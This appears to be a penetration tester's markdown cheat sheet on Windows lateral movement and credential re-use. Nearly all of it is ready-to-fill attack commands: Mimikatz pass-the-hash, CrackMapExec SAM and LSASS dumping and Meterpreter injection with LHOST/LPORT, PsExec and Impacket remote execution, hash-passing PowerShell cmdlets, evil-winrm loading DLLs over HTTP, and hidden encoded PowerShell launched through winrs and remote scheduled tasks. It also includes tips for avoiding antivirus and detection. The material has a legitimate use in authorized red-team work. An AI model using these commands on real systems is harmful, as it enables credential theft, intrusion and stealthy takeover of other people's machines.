# Windows - Lateral movements

### Local credential re-use

###### runas

Set the main DNS server on the attacking computer to the Domain Controller IP
address:

```
Control Panel -> Network and Internet -> Network and Sharing Center -> Change adapter setting -> right click on the adapter being used -> Properties -> Internet Protocol Version 4 (TCP/IPv4) -> Properties -> Set the Preferred DNS server field  
```

To authenticate locally as another user (with plaintext credentials) and
execute PowerShell commands, the `runas` utility can be used.

```
# runas
# Use /NetOnly on off-domain machines
runas /NetOnly /user:<DOMAIN>\<USERNAME> powershell.exe
```

The `NetOnly` option will make `runas` execute on your local computer as the
currently logged on user, but any connections to other computers on the network
will be made using the user account specified.

###### Start-Process / Start-Job

The `Start-Process` and `Start-Job` PowerShell cmdlets can be used to start a
local process under the identify of another user.

To run the specified process in an elevated security context through a
interactive logon on a system with `User Account Control (UAC)` enabled, the
`-Verb RunAs` parameter, for `Run as administrator`, can be specified.

```
$secpasswd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $secpasswd)

Start-Process <cmd.exe | powershell.exe | ...> -Credential $creds
Start-Process <cmd.exe | powershell.exe | ...> -Credential $creds -Verb RunAs

$ProcessJob = Start-Job -ScriptBlock { <POWERSHELL> } -Credential $creds
Wait-Job $ProcessJob
Receive-Job -Job $ProcessJob
```

###### Mimikatz Pass-The-Hash

The Pass-The-Hash module of `mimikatz` can be used to locally run a process
under another user identity using its `NTLM` hash:

```
# Default to /run:cmd.exe.
# Command can be any binary such as powershell.exe or mmc.exe for example.
# Specifying arguments is supported as well.
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN_FQDN> /ntlm:<HASH_NTLM> /run:<COMMAND>
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN_FQDN> [/aes128:<USER_AES128_KEY> | /aes256:<USER_AES256_KEY>] /run:<COMMAND>
```

###### PowerShell Credential option

Most of the PowerShell's `Remote Server Administration Tools (RSAT)` cmdlets
support the `Credential` option, to run the cmdlet as the specified user
account. An username or a `PSCredential` object can be used.

A similar mechanism is also implemented in the PowerShell `PowerSploit`
framework.

### Lateral movements

Multiples mechanisms and tools can be used to access computers remotely:

  - Using `PsExec` and psexec-like utilities that will create and run a service
    remotely over `SMB` (port 445) or `NetBIOS` (port 139)
  - Using `Windows Management Instrumentation (WMI)` (ports 135 or 445) or
    `Windows Remote Management (WinRM)` (HTTP based API on
    ports 5985 / 5986)
  - Through a graphical interface over `Remote Desktop Protocol (RDP)` (port
    3389). User must be part of the `Remote Desktop User` /
    `Utilisateurs du Bureau à distance` group on the targeted computer
  - Remotely creating a Windows `service` or a `schedule task`
  - Using third parties applications, notably used by IT support for remote
    help desk and support sessions  

Note that the credentials used for authentication and command execution
through `SMB` must have elevated privileges on the targeted machine. To conduct
pass-the-hash authentication the user account must moreover be the built-in
local `RID-500` administrator account or be a domain account. Local accounts
`RID != 500` member of the `Administrators` / `Administrateurs` group can only
authenticate using plain text credentials since Microsoft update `KB2871997`.   

To quickly identity which servers or workstations in the domain are exposing one
of the service above from your network standpoint, AD queries and `nmap` can be
used in combination (refer to the `[Active Directory] Methodology - Domain
Recon` note).

###### CrackMapExec

`CrackMapExec` is a "Swiss army knife for pentesting Windows/Active Directory
environments".  

`CrackMapExec` can notably be used to test credentials (password or hashes)
through SMB, WMI or MSSQL for local administrator access on a large range of targets.

CME has three different command execution methods and, by default will fail over
to a different execution method if one fails. It attempts to execute commands
in the following order:
  1. `wmiexec` executes commands via WMI
  2. `atexec` executes commands by scheduling a task with windows task scheduler
  3. `smbexec` executes commands by creating and running a service

As with `PsExec`, the credentials supplied for authentication must have elevated
privileges on the targeted system.

`CrackMapExec` include multiples modules:

```
crackmapexec --list-modules

[*] empire_exec          Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] mimikittenz          Executes Mimikittenz
[*] rundll32_exec        Executes a command using rundll32 and Windows's native javascript interpreter
[*] com_exec             Executes a command using a COM scriptlet to bypass whitelisting
[*] tokenrider           Allows for automatic token enumeration, impersonation and mass lateral spread using privileges instead of dumped credentials
[*] tokens               Enumerates available tokens using Powersploit's Invoke-TokenManipulation
[*] mimikatz             Executes PowerSploit's Invoke-Mimikatz.ps1 script
[*] powerview            Wrapper for PowerView's functions
[*] shellinject          Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
[*] enum_chrome          Uses Powersploit's Invoke-Mimikatz.ps1 script to decrypt saved Chrome passwords
[*] metinject            Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
[*] peinject             Downloads the specified DLL/EXE and injects it into memory using PowerSploit's Invoke-ReflectivePEInjection.ps1 script
[*] eventvwr_bypass      Executes a command using the eventvwr.exe fileless UAC bypass
```

CME cheat sheet:

```
# As of December 2018, no output to file file.
# Use | tee <OUTPUT_FILE> to display standard output and stored result to a file

# TARGETS can be IP(s), range(s), CIDR(s), hostname(s), FQDN(s) or file(s) containg a list of targets

crackmapexec <TARGETS> [-M <MODULE> [-o <MODULE_OPTION>]] (-d <DOMAIN> | --local-auth) -u <USERNAME | USERNAMES_FILE> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>) [--sam] [-x <COMMAND> | -X <PS_COMMAND>]

# SAM
crackmapexec <TARGETS> --sam (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)

# LSASS dump
crackmapexec <TARGETS> -M mimikatz (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)

# Meterpreter
# msf > use multi/handler
# msf exploit(handler) > set payload windows/meterpreter/reverse_https
crackmapexec <TARGETS> -M metinject -o LHOST=<HOST> LPORT=<PORT> -d <DOMAIN> -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
```

Note that:

  - the `--lsa` option dumps LSA secrets which can't be used in PtH attack and
    are harder to crack
  - The `<TARGET>` and `<MODULE>` should be specified before the credentials as
    a CME bug could skip the targets / module otherwise
  - If the targeted host is unreachable, CME will exit with out returning any
    error message
  - In case the metinject fails, a local administrator can be added for RDP
    access or a powershell reverse shell injected in memory (refer to the
    `[General] Shells - PowerShell` note)

###### Over SMB

*PsExec*

The `PsExec` CLI utility, from the `sysinternals` suite and signed by
Microsoft, can be used to execute commands, locally or remotely and under the
current user or the specified user identity.

While the use of a more complete attack framework is recommended on the
attacking machine (such as `CrackMapExec` or `Metasploit`), `PsExec` can be
uploaded on a compromised host in order to reach segregated targets as it will
not raise any anti-virus alerts.

`PsExec` uses a named pipe over the `Server Message Block (SMB)` protocol,
which runs on TCP port 445. The utility will connect to the `ADMIN$` share of
the targeted host, upload the `PSEXESVC.exe` binary and use the `Service
Control Manager` to start the aforementioned binary.

```
# -s   Run the remote process in the System account.
# -i   Run the program so that it interacts with the desktop of the specified session on the remote system
# -d   Don't wait for process to terminate (non-interactive).

psexec [\\computer[,computer2[,...] | @file]] [-u user [-p psswd]] [-n s] [-r servicename] [-h] [-l] [-s|-e] [-x] [-i [session]] [-c [-f|-v]] [-w directory] [-d] [-<priority>][-a n,n,...] cmd [arguments]

# Current user identity
# Use the -s option to run as SYSTEM if needed
psexec.exe -accepteula \\<HOST | IP> -s -i -d cmd.exe
psexec.exe -accepteula \\<HOST | IP> -u <DOMAIN | WORKGROUP>\<USERNAME> -p <PASSWORD> -s -i -d cmd.exe
psexec.exe -accepteula \\<HOST | IP> -s -i -d cmd.exe /c <COMMAND> <COMMAND_ARGS>
```

*Metasploit PsExec*

The `Metasploit` module *exploit/windows/smb/psexec* can be used to execute a
metasploit payload on a target.

This module uses a valid administrator username and password or password hash to
execute an arbitrary payload, similarly to the `PsExec` utility provided by
`SysInternals`.

```
# If using a password hash, set SMBPass to <LM_HASH:NT_HASH>
msf> use exploit/windows/smb/psexec
```

*Impacket psexec.py*

The python script `psexec.py` from the scripts collection `Impacket` can be used
as a substitute to the SysInternals or Metasploit psexec tools.

Usage:

```
# The --target-ip specify the IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is an unresolvable NetBIOS name.
# The command default to
psexec.py [-hashes <LM_HASH:NT_HASH>] [-dc-ip <DC_IP>] [-target-ip <TARGET_IP>] [-port [<PORT>]] [[<DOMAIN>/]<USERNAME>[:<PASSWORD>]@]<HOSTNAME | IP> [<COMMAND> [<COMMAND> ...]]
```

Contrary to the two previous tools, the python `Impacket`'s `psexec.py` can be
easily incorporated in scripts:

```
import psexec

psobject = psexec.PSEXEC("cmd.exe", "c:\\windows\\system32\\", None, "445/SMB", username = '<USERNAME>', password = '<PASSWORD>')
raw_result = psobject.run("<HOSTNAME | IP>")
print raw_result
psobject.kill();
```

*Invoke-SMBExec*

The `Invoke-SMBExec` PowerShell cmdlet can be used to pass the hash over SMB in PowerShell.

The `Invoke-SMBExec` cmdlet present the advantage to create and delete a
service with a random name, making it harder for detection.

```
Invoke-SMBExec -Target <HOSTNAME | IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLMHASH> -Command "<CMD>" -verbose
```

###### Over WMI

The `Windows Management Instrumentation (WMI)` is a Microsoft suite of tools
used to retrieve management data and manage Windows assets both locally and
over the network.  

`WMI` rely on two protocols when used over the network: `DCOM` (by default) and
`WinRM`. DCOM establishes an initial connection over TCP port 135 and any
subsequent data is then exchanged over a randomly selected TCP port.

`WMI` is divided in a collection of predefined classes. The `Win32_Process`
class can be used to start a process and the `Win32_Product` class can be used
to install an MSI installer package, both locally and remotely.

```
WMIC /NODE:<HOSTNAME | IP> COMPUTERSYSTEM GET USERNAME
Invoke-WmiMethod -Class Win32_Process -Name Create "cmd.exe"
```

The `Invoke-WMIExec` PowerShell cmdlet can be used to pass the hash over `WMI`
in PowerShell:

```
Invoke-WMIExec -Target <HOSTNAME | IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLMHASH> -Command "<CMD>" -verbose
```

###### Over WinRM

*PowerShell's WinRM remoting*

Windows Remote Management (`WinRM`) is the Microsoft implementation of
WS-Management Protocol, a standard Simple Object Access Protocol
(`SOAP`)-based, protocol that allows hardware and operating systems, from
different vendors, to interoperate. By default, `WinRM` uses the TCP ports 5985
and 5986 for connections, respectively over HTTP and HTTPS. For more
information about `WinRM` itself, refer to the `L7 - 5985-5986 WSMan` note.

Multiples cmdlets are incorporated into the PowerShell core to execute commands
remotely through `WinRM`:

```
$user = '<USERNAME>';
$pass = '<PASSWORD>';
$spass = ConvertTo-SecureString -AsPlainText $pass -Force;
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList $user,$spass;

# Execute a single command
Invoke-Command -ComputerName <HOSTNAME | IP> -Credential $creds -ScriptBlock { <POWERSHELL> };

# Interactive PowerShell session
Enter-PSSession -ComputerName <HOSTNAME | IP> -Credential $creds

# WinRM over HTTP 5985
winrs /noprofile -r:<HOSTNAME | IP> -u:<DOMAIN | WORKGROUP>\<USERNAME> -p:<PASSWORD> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Enc [...]
# WinRM over HTTPS 5986
winrs /noprofile /usessl -r:<HOSTNAME | IP> -u:<DOMAIN | WORKGROUP>\<USERNAME> -p:<PASSWORD> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Enc [...]
```

To solve the "double hop" authentication problem, which occurs whenever trying
to access resources on a third server from the first remotely connected server,
the `CredSSP` authentication mechanism can be used. Simply put, the problem
happens because credentials are not allowed for delegation and thus can't be
passed whenever accessing network resources from the remotely connected system.
All access ends up being unauthenticated and results in `Access denied` errors.      

Supports for `CredSSP` must be activated and configured on the client attacking
system. The configuration below allows delegation to any system.

```
winrm quickconfig
Set-Item WSMan:localhost\client\trustedhosts -value *
Enable-WSManCredSSP -Role "Client" -DelegateComputer "*"

Start gpedit.msc
-> "Local Computer Policy" -> "Computer Configuration" -> "Administrative Templates" -> "System" -> "Credential Delegation"
-> In the "Settings" pane, "Allow Delegating Fresh Credentials with NTLM-only Server Authentication". -> "Enabled"
-> And in the "Options" area, "Show" -> "Value" = WSMAN/*
-> "Concatenate OS defaults with input above" checked
```

Once `CredSSP` is activated and correctly configured, the PowerShell cmdlets
`Invoke-Command` and `Enter-PSSession` can be used with the
`-Authentication CredSSP` option to make connections using `CredSSP`.

*WinRM remoting from Linux*

The following `ruby` script can be used to start a PowerShell session on a
distant Windows system through a `WinRM` service:

```ruby
require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new(
  endpoint: 'http://<IP>:<PORT/wsman',
  transport: :ssl,
  user: '<USERNAME>',
  password: '<PASSWORD>',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end
    puts "Exiting with code #{output.exitcode}"
end
```

Note that the script does not support `CredSSP` authentication and is thus
prone to the "double hop" authentication problem.

The `evil-winrm` `ruby` extend the code above with a number of functionality,
such as command history and completion, upload and download of files, loading
of in memory of `PowerShell` scripts, dll or `C#` binary, etc.

```
evil-winrm -u <USERNAME> -p '<PASSWORD' -i <HOSTNAME | IP> -s <LOCAL_PATH_PS_SCRIPTS> -e <LOCAL_PATH_EXE_SCRIPTS>
```

Supported commands:

| Command | Description |
|---------|-------------|
| download <REMOTE_PATH> <LOCAL_PATH> | Download remote file. LOCAL_PATH is not required |
| upload <LOCAL_PATH> <REMOTE_PATH> | Download remote file. |
| services | List Windows services and the associated binaries paths |
| <PS_NAME.ps1> | Load the specified PowerShell script in memory. The PowerShell script must be in the path set at -s argument **when the evil-winrm shell was started.** <br /> `menu` can be used to list the loaded cmdlets. |
| Invoke-Binary <LOCAL_BINARY_PATH> | Load the specified binary, compiled from `C#`, to be executed in memory. Accepts up to 3 arguments |
| l04d3r-LoadDll | Load dll libraries in memory, equivalent to: `[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("pwn.dll"))` |

```
l04d3r-LoadDll -smb -path \\<HOSTNAME | IP>\\<SHARE>\\<DLL>
l04d3r-LoadDll -local -path <LOCAL_DLL_PATH>
l04d3r-LoadDll -http -path http://<URL>/<DLL>
```

###### Remote Windows service

The Windows built-in utility `Sc` can be used to remotely create and start a
Windows service.

Note that if the specified binary is not a service binary (i.e. a binary
implementing the `LPSERVICE_MAIN_FUNCTION` callback function), an error message
will be raised (`Error 1053: The service did not respond to the start or
control request in a timely fashion.`). The binary will however have been
executed once, which for some payload may be sufficient (`meterpreter`
notably).

```
# The binary can be uploaded on the target through smb
sc \\<IP | HOSTNAME> create <SERVICE_NAME> binpath= "<BINARY_PATH>"
sc \\<IP | HOSTNAME> start <SERVICE_NAME>
```

###### Remote scheduled task

The Windows built-in utility `schtasks` can be used to remotely create and
start a Windows scheduled tasks.

While `schtasks` does not have a "run now" option, a scheduled task can be
programmed to run once and starts in a few minutes. The `/Z` switch can be
specified to automatically delete the scheduled task after execution. It may
however raise compatibility issue, in which case the scheduled task could be
deleted manually.

```
# Create a scheduled task to run PowerShell code for example
schtasks /create /tn "<TASK_NAME>" /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Enc [...]" /sc once /sd <MM/DD/YYYY> /st <HH:MM:SS> /V1 /Z /RU "NT AUTHORITY\SYSTEM" /S <IP | HOSTNAME>

# The creation and status of the scheduled task can be validated
schtasks /query /tn "<TASK_NAME>" /S <IP | HOSTNAME>

schtasks /run /tn "<TASK_NAME>" /S <IP | HOSTNAME>

schtasks /delete /tn "<TASK_NAME>" /S <IP | HOSTNAME>
```
